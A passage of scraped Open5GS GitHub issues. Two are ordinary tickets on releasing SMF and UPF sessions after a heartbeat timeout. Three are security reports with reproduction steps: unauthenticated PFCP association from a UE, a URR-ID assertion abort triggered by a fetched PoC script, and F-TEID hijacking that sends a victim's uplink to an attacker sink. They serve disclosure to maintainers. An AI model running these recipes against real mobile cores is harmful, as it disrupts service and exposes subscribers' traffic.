items.title: [Bug]: SMF: not releasing existing UE sessions after UPF failure (Heartbeat timeout)

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (master)

### Steps to reproduce

TTCN-3 test SMF_Tests.TC_pfcp_heartbeat_timeout from osmo-ttcn3-hacks.git showcases the scenario:
https://gerrit.osmocom.org/c/osmo-ttcn3-hacks/+/43873

### Logs

```shell
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Response Timeout for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:623)
10/12 11:54:40.821: [pfcp] WARNING: [2] LOCAL  No Reponse. Give up! for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:642)
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Delete  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:836)
10/12 11:54:40.821: [smf] DEBUG: smf_state_operational(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/smf-sm.c:94)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] WARNING: No Heartbeat from UPF [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:426)
10/12 11:54:40.821: [smf] ERROR: No UPF available (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:528)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): EXIT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] INFO: PFCP de-associated [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:205)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_will_associate(): ENTRY (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:74)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Create  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:131)
10/12 11:54:40.821: [pfcp] DEBUG: Association Setup Request (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/build.c:87)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  UPD TX-5  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:231)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Commit  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:500)
```

### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

### eNodeB/gNodeB

TTCN-3

### UE Models and versions

_No response_

items.title: Get rid of time.message.duration

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

labels.name: status:needs-planning
labels.description: Issue accepted and needs planning into milestones

items.body:
Right now, lots of timer timeout values are calculated/derived based on the same time.message.duration value, which defaults to `local_conf.time.message.duration = ogs_time_from_sec(10)` and can be set through config file:
```
time:
  message:
    duration: 20000
```

This creates problems, since for instance in open5gs-smfd GTPv2C timeout values are set to the same values as PFCP ones, which is IMHO wrong, since in most cases (UE initiated procedures) the GTPv2C procedures will take more time than the PFCP procedures (ie. the later are inner steps of the former).

As a result, while the PFCP procedure is ongoing (or failing at some point), the GTPv2C gtp_xact may have been freed earlier, which means when the inner PGCP procedure finishes (correctly or not), there no way to reach back towards the UE.


In order to fix this, the ogs-config should have proper separation of config fields, one for each timeout, with a sane set of defaults (maybe also defaults tweaked by the application), which can then independently be modified through config file.
Extra logging warning the user can be added if some wrong configured is detected (like the PFCP timeout >= GTPv2C timeout mentioned above).

items.title: [Security Bug]: PFCP Association Setup Requests accepted from any unauthenticated source on both UPF and SMF

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). UPF-side acceptance also observed on
v2.7.6 and v2.4.14.

### Security impact

A single registered UE becomes a trusted PFCP control-plane peer of the UPF
and/or the SMF. UPF side, this is the entry primitive for: remote session
modification with traffic redirection or remote DROP, remote session deletion
with CP/UP desync, and rogue session establishment claiming other UEs' IP
addresses (separate report).

**CVSS v3.1 Score: 7.1 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N
### Affected components

Both PFCP endpoints, with the **same root cause in shared code**:
`ogs_pfcp_node_add()` (`lib/pfcp/context.c:928`) is called unconditionally on
any inbound Association Setup Request by both

- **UPF** — `src/upf/pfcp-path.c:134`
- **SMF** — `src/smf/pfcp-path.c:171`

Neither call site performs an allow-list check, credential check, or any
comparison of the source address against the configured peers.

### Summary

Both the UPF and the SMF accept a PFCP Association Setup Request from **any**
source that can reach their N4 port and immediately treat it as a trusted
peer. The Node ID IE carried in the request is attacker-chosen (it can even
impersonate the real peer's address). Once associated:

- on the **UPF**, the rogue peer passes every association-level gate — this
  is the entry primitive for the separate cross-session issues (rule
  overwrite, remote session modification/deletion, UE-IP and F-TEID
  collisions);
- on the **SMF**, the peer is added to the node list and the SMF then
  **proactively sends PFCP Heartbeat Requests to the attacker's address** to
  maintain the association — a persistent, attacker-visible control channel.

In our lab both N4 ports are reachable **from the data plane**: a PFCP/UDP
datagram sent as the payload of an ordinary uplink IP packet over an attached
UE's PDU session is GTP-U-encapsulated by the (honest) gNB, decapsulated by
the UPF, and the kernel delivers the inner datagram to the target's PFCP
socket (UPF or SMF). The attacker needs only a registered UE — no
N4 network access at all.

### Steps to reproduce

1. Bring up Open5GS 5GC with one gNB and UERANSIM UE(s). Attacker UE data
   address `10.45.0.2`; in the multi-UE lab the UPF N4 is
   `192.168.231.132:8805`; in the single-UE lab the UPF N4 is
   `192.168.230.132:8805` and the SMF N4 is `192.168.230.133:8805`.
2. From the attacker UE's container, send a PFCP Association Setup Request as
   the payload of an uplink IP packet through the established PDU session:

   | Field | Value |
   |---|---|
   | Inner IP/UDP | `10.45.0.2:*` → `192.168.231.132:8805` / `192.168.230.132:8805` (UPF, multi-UE / single-UE lab) or `192.168.230.133:8805` (SMF, single-UE lab) |
   | Message type | 5 (PFCP Association Setup Request) |
   | Node ID (IE 60) | `10.45.0.2` (the UE's own data address, or a Node ID impersonating the real peer) |

3. Observe the Association Setup Response (Cause 1) and the target's log:
   the source is added as a PFCP node; on the SMF it also starts heartbeating
   the attacker on its own.

### Logs (Attached)

UPF (`logs/open5gs/upf.log`, two independent runs):

```shell
08/28 16:42:09.147: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
08/28 18:33:13.191: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
```

Association Setup Request and Response captured in `capture-n4.pcap`
(frames 21–22 of the q006 multi-UE-lab run: request with Node ID
`10.45.0.2`, then `AssocSetupResponse ... IE19 Cause=1 (Request accepted)`
at frame 22). After the
association is up, every later N4 message from the UE is processed as a
trusted peer:

```shell
[upf] DEBUG: Merged PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-path.c:161)
[upf] DEBUG: Session Modification Request (../open5gs-src/src/upf/n4-handler.c:258)  # peer [10.45.0.2]:8805
```

SMF (`logs/open5gs/smf.log`) — acceptance plus SMF-originated heartbeats to
the attacker's address:

```shell
08/28 14:19:46.117: [smf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/smf/pfcp-sm.c:189)
08/28 14:19:46.117: [pfcp] DEBUG: [13] LOCAL  Create  peer [10.45.0.2]:8805 (../open5gs-src/lib/pfcp/xact.c:130)
08/28 14:19:46.117: [pfcp] DEBUG: Heartbeat Request (../open5gs-src/lib/pfcp/build.c:28)
08/28 14:19:46.117: [pfcp] DEBUG: [13] LOCAL  UPD TX-1  peer [10.45.0.2]:8805 (../open5gs-src/lib/pfcp/xact.c:229)
08/28 14:19:46.119: [smf] DEBUG: Found PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/smf/pfcp-path.c:192)
08/28 14:19:46.119: [smf] DEBUG: Merged PFCP-Node: addr_list [10.45.0.2]:8805 (../open5gs-src/src/smf/pfcp-path.c:198)
```

The SMF keeps the association alive with its own heartbeats — one on the
wire in the single-UE-lab run's `capture-n4.pcap` (frame 3, SMF →
`10.45.0.2` Heartbeat Request, sent immediately after the Association Setup
Response), and a second one at the next heartbeat timer cycle, alongside
the heartbeat it sends to the real UPF peer:

```shell
08/28 14:19:50.040: [pfcp] DEBUG: [14] LOCAL  Create  peer [192.168.230.132]:8805 (../open5gs-src/lib/pfcp/xact.c:130)
08/28 14:19:50.040: [pfcp] DEBUG: Heartbeat Request (../open5gs-src/lib/pfcp/build.c:28)
08/28 14:19:57.121: [pfcp] DEBUG: [16] LOCAL  Create  peer [10.45.0.2]:8805 (../open5gs-src/lib/pfcp/xact.c:130)
08/28 14:19:57.121: [pfcp] DEBUG: Heartbeat Request (../open5gs-src/lib/pfcp/build.c:28)
```

### Expected behaviour

A PFCP endpoint should only form associations with configured/authorized
peers. An Association Setup Request from a source that is not a configured
peer address (in particular, one arriving from the user-plane/data side)
should be rejected (or ignored), the source must never be added to the PFCP
peer list, and no timer traffic (heartbeats) must ever be sent to it.

### Observed Behaviour


Both call sites share the same unauthenticated node-creation helper:

```c
/* lib/pfcp/context.c */
ogs_pfcp_node_t *ogs_pfcp_node_add(ogs_list_t *list,
    ogs_pfcp_node_id_t *node_id, ogs_sockaddr_t *from)
```

UPF inbound path — an unknown source that sends an Association Setup type
gets a node created **from the packet** (attacker-supplied Node ID), FSM
initialized, and the FSM immediately moves to the associated state:

```c
/* src/upf/pfcp-path.c (pfcp_recv_cb) */
node = ogs_pfcp_node_find(&ogs_pfcp_self()->pfcp_peer_list,
        pfcp_status == OGS_PFCP_STATUS_SUCCESS ? &node_id : NULL, &from);
if (!node) {
    if (message->h.type == OGS_PFCP_ASSOCIATION_SETUP_REQUEST_TYPE ||
        message->h.type == OGS_PFCP_ASSOCIATION_SETUP_RESPONSE_TYPE) {
        ogs_assert(pfcp_status == OGS_PFCP_STATUS_SUCCESS);
        node = ogs_pfcp_node_add(&ogs_pfcp_self()->pfcp_peer_list,
                &node_id, &from);          /* <- attacker becomes a peer */
        ...
        pfcp_node_fsm_init(node, false);
    } else {
        ogs_error("Cannot find PFCP-Node: ...");   /* every other type: rejected */
```

```c
/* src/upf/pfcp-sm.c — upf_pfcp_state_will_associate() */
case OGS_PFCP_ASSOCIATION_SETUP_REQUEST_TYPE:
    ogs_pfcp_up_handle_association_setup_request(node, xact,
            &message->pfcp_association_setup_request);
    OGS_FSM_TRAN(s, upf_pfcp_state_associated);   /* <- no source validation */
    break;
```

SMF inbound path — identical shape, same shared helper, no validation of the
source address:

```c
/* src/smf/pfcp-path.c (pfcp_recv_cb) */
if (message->h.type == OGS_PFCP_ASSOCIATION_SETUP_REQUEST_TYPE ||
    message->h.type == OGS_PFCP_ASSOCIATION_SETUP_RESPONSE_TYPE) {
    node = ogs_pfcp_node_add(&ogs_pfcp_self()->pfcp_peer_list,
            &node_id, &from);                 /* <- attacker becomes a peer */
    ...
    pfcp_node_fsm_init(node, false);
```

The heartbeat timer then treats the attacker node like any trusted peer.
There is no comparison of `from` against configured peer addresses and no
authentication of any kind on N4. Note this is distinct from open5gs#4204
(PFCP peer-pool exhaustion): #4204 is a resource-exhaustion defect; here a
**single** unauthenticated request is accepted and acted upon.

[R1-pfcp-unauthenticated-association.zip](https://github.com/user-attachments/files/31614486/R1-pfcp-unauthenticated-association.zip)

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.body:
### Open5GS Release, Revision, or Tag

v2.8.1

### Steps to reproduce

This is the counterpart of ticket #4860 but applied to open5gs-upfd instead of open5gs-smfd.

Apparently open5gs-upfd is not currently deleting session when the SMF is considered in failure (due to eg. Heartbeat timeout).

How to reproduce: Create some sessions on the UPF, then eg. kill the open5gs-smfd process, let UPF send Heartbeats until t3_holding_duration triggers.

### Logs

```shell

```

### Expected behaviour

As per TS 23.527 V18.6.0 clause 4.4.3.1:
> the UPF shall delete all the session contexts affected by the peer PFCP entity failure that it may have stored.

### Observed Behaviour

No session is deleted then according to open5gs-upfd logs.

This is well described by @MrBrownieCGN in https://github.com/open5gs/open5gs/issues/4860#issuecomment-6202375701 point 5:

> 5. UPF side (re "this same issue also probably affects open5gs-upfd")
> 
> On main, when the UPF loses the heartbeat towards the SMF it only goes back to will_associate and keeps all
> sessions (src/upf/pfcp-sm.c:342-345); sessions of that SMF are removed only when the SMF comes back with a new
> Recovery Time Stamp (pfcp_restoration(), :371-386). Here the spec is not implementation specific. TS 23.527 V18.6.0,
> clause 4.4.3.1:
> 
> >    When a UPF detects that a peer PFCP entity in the SMF is not reachable for a preconfigured time, and the MPAS or SSET
> >    procedure specified for SMF set in clause 5.22 of 3GPP TS 29.244 [4]) are not used, the UPF shall delete all the
>>     session contexts affected by the peer PFCP entity failure that it may have stored.
> 
> The "preconfigured time" can reasonably be longer than the heartbeat give-up, but some bound seems to be required.
> 

### eNodeB/gNodeB

items.title: [Bug]: a Create URR IE with URR-ID 0xFFFFFFFF and No Create PDR Bypasses the Upstream Range Check and Aborts the UPF on Session Deletion

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Summary

- **Commit ID**: `157f611a530e292e40ec50f9d23f0ef5d4fcd6a6` (tag `v2.8.0`)
- **CVSS 4.0**: 8.7 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- **Vulnerability Type**: CWE-617 / CWE-129 (Reachable Assertion / Improper Validation of Array Index)

The UPF's PFCP (N4) endpoint (UDP 8805) self-enrols any peer that sends an Association Setup Request. A PFCP Session Establishment Request can carry a Create URR IE declaring an arbitrary Usage-Report Rule ID, and the shared PFCP layer stores that raw 32-bit wire value into the session's URR entry without validating it against the fixed per-session URR table size.

The only inbound range check upstream added for this family validates URR-IDs *referenced by a Create PDR*; a request that declares a Create URR while sending **no Create PDR at all** never reaches it. With `OGS_MAX_NUM_OF_URR` = 16, the planted ID 0xFFFFFFFF sits unnoticed in the session until the peer deletes that session — the deletion path builds a usage report for every URR and asserts each ID is within 1..16, which the planted value fails.

The failing check logs a FATAL line, prints a backtrace and calls `abort()`, so three unauthenticated UDP datagrams (association setup, session establishment, session deletion) kill the UPF with SIGABRT (container exit 134). The SMF then has no usable user-plane peer and reports it, and no PDU session can be established until the UPF is restarted manually.

### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

Tested target: the `docker_open5gs` compose deployment (open5GS SA + VoNR, 23 containers); attacker runs on the Docker host (bridge `172.22.0.1`); UPF N4 at `172.22.0.8:8805/udp`. No subscribers, no RAN. Run the PoC as root — it binds the privileged PFCP source port 8805.

1. **Deploy the target core**

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
   docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
   sleep 45                     # let the NFs register at the NRF
   docker start smsc            # smsc races the MySQL init on a cold start
   # provision
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --core-network open5gs --count 5 \
        --plmn 46009 --initial-imsi-index 1 \
        --ki 12341234123412341234123412340000 \
        --opc 71a121bb69baf3c0cc53fb5038a0131f \
        --dnn internet --enable-ims \
        --core-address 127.0.0.1 --webui-port 9999 \
        --username admin --password 1423
   ```

2. **Confirm the UPF answers PFCP**

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260927-POC/upf_pfcp_urr_id_abort_poc.py
   chmod +x upf_pfcp_urr_id_abort_poc.py
   sudo ./upf_pfcp_urr_id_abort_poc.py --target 172.22.0.8 --port 8805 --heartbeat-only --live
   # -> Association Setup Response (Cause = 1); Heartbeat Response ok
   ```

3. **Run the in-range control** (identical 3-datagram flow, URR-ID = 1)

   ```bash
   sudo ./upf_pfcp_urr_id_abort_poc.py --target 172.22.0.8 --port 8805 --control urr-id-in-range --live
   # -> Session Deletion Response (133 bytes), Usage Report URR-ID=1, Cause=1; UPF stays alive
   ```

4. **Fire the defect and verify** (URR-ID 0xFFFFFFFF planted with no Create PDR)

   ```bash
   sudo ./upf_pfcp_urr_id_abort_poc.py --target 172.22.0.8 --port 8805 --live
   # -> stage 2 accepted (Cause = 1); stage 3 gets NO Session Deletion Response;
   #    post-shot liveness: alive=False
   docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}' upf
   # -> exited exit=134 oom=false
   docker logs upf 2>&1 | tail -20

### Logs

```shell
`docker logs upf` — the abort when the poisoned session is deleted (stage 3):


10/11 12:43:51.964: [upf] DEBUG: Session Deletion Request (../src/upf/n4-handler.c:454)
10/11 12:43:51.964: [upf] DEBUG: Session Deletion Response (../src/upf/n4-build.c:130)
10/11 12:43:51.964: [upf] FATAL: upf_sess_urr_acc_fill_usage_report: Assertion `urr->id > 0 && urr->id <= OGS_MAX_NUM_OF_URR' failed. (../src/upf/context.c:735)
10/11 12:43:51.964: [core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
./open5gs-upfd(+0xe14e) [0x55d202a2214e]
./open5gs-upfd(+0x17e5e) [0x55d202a2be5e]
./open5gs-upfd(+0x17092) [0x55d202a2b092]
./open5gs-upfd(+0x19c9a) [0x55d202a2dc9a]
./open5gs-upfd(+0x10ffb) [0x55d202a24ffb]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7efc7d4a82bd]
./open5gs-upfd(+0xf864) [0x55d202a23864]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7efc7d4a82bd]
./open5gs-upfd(+0x88c7) [0x55d202a1c8c7]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x12960) [0x7efc7d498960]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7efc7d2ed609]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7efc7cf4d353]
/open5gs_init.sh: line 102:    69 Aborted                 (core dumped) ./open5gs-upfd


Collateral — the SMF loses its only user-plane peer seconds later:


10/11 12:44:00.374: [smf] ERROR: No UPF available (../src/smf/pfcp-sm.c:512)
```

### Expected behaviour

An out-of-range URR-ID must be rejected when the request is accepted — a Session Establishment Response with a PFCP error cause (or the value clamped to the table size) — never stored as-is. Session deletion must then complete normally with a usage report, exactly as the in-range control shows (deletion answered, `Cause = 1`), and the process must survive peer-controlled identifiers.

### Observed Behaviour

Three unauthenticated datagrams: association setup accepted (`Cause = 1`), session establishment accepted (`Cause = 1`) with the poisoned URR-ID planted, and a session deletion that is never answered. The UPF logs the FATAL assertion at `src/upf/context.c:735`, aborts (`exit=134`, `oom=false`) and stops answering PFCP Association Setup and Heartbeat. The SMF then logs `No UPF available`, leaving the core without a user plane until the UPF is restarted manually.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Security Bug]: UE can redirect Uplink of another UE due to static F-TEID collisions outside the PFCP restoration path

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76).

### Security impact
A peer (registered UE) able to establish a PFCP association and reach N4 can claim an
arbitrary otherwise-valid GTP-U TEID, including the exact TEID of a live
session, and take over user-plane handling for that TEID.
We demonstrated the victim's uplink stream being re-encapsulated and delivered to the attacker (confidentiality/integrity break), while the victim's connectivity dropped to zero (availability), with a Cause-1 acknowledgement and a syntactically valid request.
The UE-originated PFCP association acceptance used here is the subject of the report (https://github.com/open5gs/open5gs/issues/4760);

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

**UPF** and its GTP-U TEID dispatch `ogs_pfcp_object_teid_hash_set()` (`lib/pfcp/context.c:1443`).

### Summary

A Create PDR may carry a **static F-TEID** (CH=0, TEID chosen by the peer).
When such a TEID is installed, `ogs_pfcp_object_teid_hash_set()` writes the
`self.object_teid_hash` entry unconditionally. Because there is no check
that the TEID is already mapped to a different session and no rejection of
the collision, the last write wins: after a peer installs a PDR claiming a
TEID that belongs to a live session, a GTP-U packet addressed to that TEID is
looked up in the hash (`src/upf/gtp-path.c:397`) and resolves to the attacker's
session. The UPF then iterates that session's PDRs and tests TEID, QFI, and any
packet-filter rule (`src/upf/gtp-path.c:434-474`). In the demonstrated PDR,
QFI is unset and the rule list is empty, so TEID alone selects it and the
attacker's FAR; the Source Interface comparison is compiled out at
`src/upf/gtp-path.c:448-452` (`#if 0 /* <DEPRECATED> */`).

There *is* a collision check in the tree, but it is unreachable from a normal
establishment: `lib/pfcp/handler.c:458-468` rejects a static F-TEID that is
already present in the hash with cause `INVALID_F_TEID_ALLOCATION_OPTION`, but
only when the request carries **PFCPSEReq-Flags (IE type 186) with RESTI=1**,
i.e. the 3GPP TS 23.527 restoration case, which the SMF sets only when
`OGS_PFCP_CREATE_RESTORATION_INDICATION` is set (`src/smf/n4-build.c:163-171`;
the UPF then also swaps the TEID, `src/upf/n4-handler.c:150-173`). Our smuggled
Session Establishment Request carries no PFCPSEReq-Flags IE at all (its IEs
are Node ID, F-SEID, Create PDR and Create FAR — see `est_sent_hex` in
`q031_result.json`), so that check is skipped and the unconditional write
applies. We are reporting the non-restoration path: a plain Session
Establishment that collides with a live TEID is accepted with Cause 1.

### Steps to reproduce

Lab: two attached UEs — attacker UE `10.45.0.2`, benign peer UE `10.45.0.4`;
UPF N4 `192.168.233.132:8805`, GTP-U `192.168.233.132:2152`, gNB/N3
`192.168.233.140`, attacker sink `192.168.233.150:2152`.

1. Attach both UEs; measure the peer's baseline connectivity (ICMP 3/3 uplink
   and 3/3 downlink).
2. Determine the peer session's ingress F-TEID — the TEID under which the
   gNB delivers the peer's uplink to the UPF. We read it from the N3
   capture: in `capture-n3-pre-teiddiscovery.pcap` all peer uplink G-PDUs
   carry outer TEID `0x4249` (16969) with inner `10.45.0.4 → 10.45.0.1`
   (`ingress_teid.json`: 5/5 frames). The UPF echoes that same value in the
   Created PDR IE of its Cause-1 response to the rogue request (step 4) —
   `capture-core-n4.pcap` frame 12, the only Session Establishment Response
   in that capture.
3. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`). Accepted with Cause 1
   (`capture-core-n4.pcap` frames 7–8). Heartbeats are also exchanged
   (`q031_result.json`: `hb_sent` 4, `hb_received` 2, `hb_answered` 2).
4. Send a PFCP Session Establishment Request through the same path (type 50,
   S=1, SEID `0x00000000000aae7f`, seq 3101) carrying exactly four IEs:
   Node ID (60) = `10.45.0.2`, F-SEID (57) = SEID `0x00000000000aae7f` /
   `10.45.0.2`, Create PDR (1) = {PDR ID (56) 21, Precedence (29) 255,
   PDI (2) {Source Interface (20) = ACCESS (0), F-TEID (21) flags `0x01`
   (V4, CH=0) / TEID `0x4249` / IPv4 `192.168.233.140`}, FAR ID (108) 21},
   and Create FAR (3) = {FAR ID 21, Apply Action (44) = FORWARD (`02 00` on
   the wire; FORW bit `0x02`), Forwarding Parameters (4) {Outer Header
   Creation (84) description `01 00` = GTP-U/UDP/IPv4, TEID `0x03110001`,
   IPv4 `192.168.233.150`}}. Note the absent **PFCPSEReq-Flags IE (186)**.
5. Verify at the data plane: (a) send 8 attacker-generated GTP-U datagrams
   from `10.45.0.2` to the UPF's GTP-U address `192.168.233.132:2152`, carried
   through the attacker's own PDU session; each generated GTP-U header uses
   TEID `0x4249` and carries the 23-byte marker
   `GTPU-TEID-TAKEOVER-TEST`; (b) generate fresh genuine uplink traffic from
   the peer UE (ICMP toward the data network); listen on the sink and
   re-measure the peer's connectivity.

We confirmed the takeover of a **live** session end-to-end from the UE
position in a two-UE lab: the benign peer's session uplink arrived at the UPF
under ingress F-TEID `0x4249`; the rogue PDR claimed exactly that static
TEID and was accepted with Cause 1 (Request accepted), the UPF echoing the
colliding TEID back in the Created PDR IE. Afterwards the peer's **genuine
uplink traffic** was re-encapsulated under the attacker's FAR and delivered
to the attacker's sink (34 captured frames), while the peer's end-to-end
connectivity collapsed from 3/3 to 0/3 in both directions. The takeover
outlived the rogue PFCP association itself: the peer's uplink was still being
delivered to the attacker's sink 84 s after the rogue association was
de-associated.

### Logs (Attached)

[R5-upf-static-fteid-collision.zip](https://github.com/user-attachments/files/31690192/R5-upf-static-fteid-collision.zip)

```shell
09/01 08:05:18.181: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
09/01 08:05:18.201: [upf] DEBUG: Session Establishment Response (../open5gs-src/src/upf/n4-build.c:36)
```
(both lines quoted from `ue-q031/upf_test_window_evidence.txt`, a grep of the
live UPF log over the test window; the bundled `upf.log.tail` covers
08:06:02–08:07:08 and therefore starts after the attack)

Establishment response (`q031_result.json`, `capture-core-n4.pcap`): Cause 1
"Request Accepted", UP F-SEID 2536, Created PDR
`{"pdr_id": 21, "teid": 16969}` — the UPF accepts the attacker-chosen static
TEID equal to the peer's live ingress TEID (`0x4249`) and echoes it back
(tshark decode of `capture-core-n4.pcap` frame 12: `Cause : Request
accepted(success)`, `F-SEID : SEID: 0x00000000000009e8`, `Created PDR ... PDR
ID : 21 ... F-TEID : TEID: 0x00004249`). No collision is detected on this
path, no error cause is returned, and no GTP-U Error Indication is emitted.

Sink capture (`q031_sink.log`) — the takeover on the wire:

- **8/8 injected marker datagrams** (marker `GTPU-TEID-TAKEOVER-TEST`, outer
  TEID `0x03110001`) delivered to the attacker's sink;
- **34 frames of the peer's genuine uplink ICMP** re-encapsulated under the
  attacker's FAR: outer `192.168.233.132:2152 → 192.168.233.150:2152`, TEID
  `0x03110001`, inner IP `10.45.0.4 → 10.45.0.1` (the peer's own packets),
  proving disclosure at the attacker's sink;

### Expected behaviour

The UPF must reject a Create PDR whose static F-TEID collides with a TEID
already mapped to a different PDR/session and must not modify the existing
TEID→object mapping. Open5GS already uses Cause 71
(`INVALID_F_TEID_ALLOCATION_OPTION`, `lib/pfcp/types.h:48`) for this collision
in the restoration path (`lib/pfcp/handler.c:458-468`).

### Observed Behaviour

```c
/* lib/pfcp/context.c:1519-1535 — ogs_pfcp_object_teid_hash_set() */
if (pdr->hash.teid.len)
    ogs_hash_set(self.object_teid_hash,
            &pdr->hash.teid.key, pdr->hash.teid.len, NULL);

pdr->hash.teid.key = pdr->f_teid.teid;
pdr->hash.teid.len = sizeof(pdr->hash.teid.key);

switch(type) {
case OGS_PFCP_OBJ_PDR_TYPE:
    ogs_hash_set(self.object_teid_hash,
            &pdr->hash.teid.key, pdr->hash.teid.len, pdr);
    break;
case OGS_PFCP_OBJ_SESS_TYPE:
    ogs_assert(pdr->sess);
    ogs_hash_set(self.object_teid_hash, # <--- unconditional
            &pdr->hash.teid.key, pdr->hash.teid.len, pdr->sess);
    break;
```

Lines 1528/1533 are the install and are unconditional: whatever object
previously owned the key is silently replaced, while the dispossessed
session/PDR retains its own `hash.teid` key/len for the same TEID. (The write
at 1520 only removes the calling PDR's own previous key, if it had one.)
Neither branch detects a collision, so the response returns Cause 1 and the
Created PDR IE echoes the accepted TEID as if it were freshly assigned.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: UPF crash via PFCP transaction/timer exhaustion triggered by repeated GTP-U Error Indications

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
